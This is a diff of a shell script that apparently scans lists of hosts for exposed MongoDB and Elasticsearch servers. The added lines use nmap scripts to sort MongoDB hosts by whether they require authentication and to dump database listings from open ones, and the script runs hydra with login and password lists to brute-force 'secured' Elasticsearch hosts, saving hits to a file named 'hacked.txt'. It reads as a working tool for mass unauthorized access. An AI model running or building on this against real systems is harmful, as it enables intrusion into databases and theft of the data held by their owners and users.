@@ -57,10 +57,12 @@ if [[ "$1" == "27017" ]]; then
 
         cat map.input | while read line
 do
-
-        if curl -X GET "$line:27017/" | grep "MongoDB";
-                then echo $line >> mongodb.txt;
-		 nmap $line -p$1 --script=mongodb-databases.nse | grep "|">> mongodb.txt
+	mdbstat=$(nmap $line -p$1 --script=mongodb-info.nse | grep -v codeName | grep code | awk {'print $4'})
+	
+	if  [[ "$mdbstat" == "13" ]]; then echo $line >> mongodb_secured.txt; 
+	else
+        	echo $line >> mongodb.txt;
+		nmap $line -p$1 --script=mongodb-databases.nse | grep "|">> mongodb.txt
         fi
 done
 fi
@@ -68,9 +70,14 @@ fi
 
 #brute secured elastics
 
-if [ -s elastic_secured.txt ]
 
-then /usr/bin/hydra -M ./elastic_secured.txt -L ./LOGINS -P ./PASSWORDS -f -V -s 9200 -o ./hacked.txt http-get /
+if [[ $(find ./ -name elastic_secured.txt -type f -size +1 2>/dev/null) ]]; 
+
+	then /usr/bin/hydra -M ./elastic_secured.txt -L ./LOGINS -P ./PASSWORDS -f -V -s 9200 -o ./hacked.txt http-get /
 
 fi
+
+
+#brute secured mongo
+
 
